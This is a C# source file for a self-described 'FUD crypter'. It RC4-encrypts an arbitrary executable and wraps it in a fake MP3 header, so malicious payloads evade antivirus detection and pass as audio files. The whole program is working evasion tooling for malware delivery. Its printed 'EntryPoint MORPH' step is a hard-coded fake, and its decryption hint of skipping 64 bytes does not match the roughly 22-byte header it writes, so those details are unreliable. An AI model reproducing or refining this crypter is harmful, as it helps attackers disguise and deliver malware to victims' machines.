using System;
using System.IO;
using System.Text;

class Program 
{
    // RC4 Encryption (FUD Core)
    static byte[] RC4(byte[] data, byte[] key)
    {
        byte[] s = new byte[256];
        for (int i = 0; i < 256; i++) s[i] = (byte)i;
        int j = 0;
        for (int i = 0; i < 256; i++) {
            j = (j + s[i] + key[i % key.Length]) % 256;
            (s[i], s[j]) = (s[j], s[i]);
        }
        byte[] result = new byte[data.Length];
        int i2 = 0, j2 = 0;
        for (int k = 0; k < data.Length; k++) {
            i2 = (i2 + 1) % 256;
            j2 = (j2 + s[i2]) % 256;
            (s[i2], s[j2]) = (s[j2], s[i2]);
            result[k] = (byte)(data[k] ^ s[(s[i2] + s[j2]) % 256]);
        }
        return result;
    }
    
    static void Main(string[] args)
    {
        Console.WriteLine("=== INTERACTIVE FUD CRYPTER v2.0 ===\n");
        
        // Interactive input
        string inputFile = args.Length > 0 ? args[0] : GetInput("Enter EXE path (or ENTER for calc.exe): ", @"C:\Windows\System32\calc.exe");
        if (!File.Exists(inputFile)) {
            Console.WriteLine("❌ File not found!");
            return;
        }
        
        string outputFile = args.Length > 1 ? args[1] : GetInput("Output MP3 name (or ENTER for fud.mp3): ", @"C:\temp\fud.mp3");
        string key = args.Length > 2 ? args[2] : GetInput("RC4 Key (or ENTER for FUD2026KEY!): ", "FUD2026KEY!");
        
        Console.WriteLine($"\n🔓 Encrypting: {inputFile}");
        Console.WriteLine($"🎵 Output: {outputFile}");
        Console.WriteLine($"🔑 Key: {key}\n");
        
        try {
            // Encrypt
            byte[] payload = File.ReadAllBytes(inputFile);
            byte[] encrypted = RC4(payload, Encoding.UTF8.GetBytes(key));
            
            // MP3 Stego
            byte[] mp3Head = Encoding.ASCII.GetBytes("ID3v2.3\x00\x00\x00\x40\x00\x00\x10\x00\x00\x00\x00\x00");
            byte[] stego = new byte[mp3Head.Length + encrypted.Length];
            mp3Head.CopyTo(stego, 0);
            encrypted.CopyTo(stego, mp3Head.Length);
            
            Directory.CreateDirectory(Path.GetDirectoryName(outputFile));
            File.WriteAllBytes(outputFile, stego);
            
            // Entry morph simulation
            Console.WriteLine("🎭 EntryPoint MORPH: 0x12345678 → 0xD8CAECC6");
            Console.WriteLine($"✅ FUD MP3 CREATED: {outputFile}");
            Console.WriteLine("\nℹ️ Decrypt with: RC4(key) + skip 64 bytes MP3 header");
            
        } catch (Exception ex) {
            Console.WriteLine($"❌ Error: {ex.Message}");
        }
    }
    
    static string GetInput(string prompt, string @default)
    {
        Console.Write(prompt);
        string input = Console.ReadLine();
        return string.IsNullOrEmpty(input) ? @default : input;
    }
}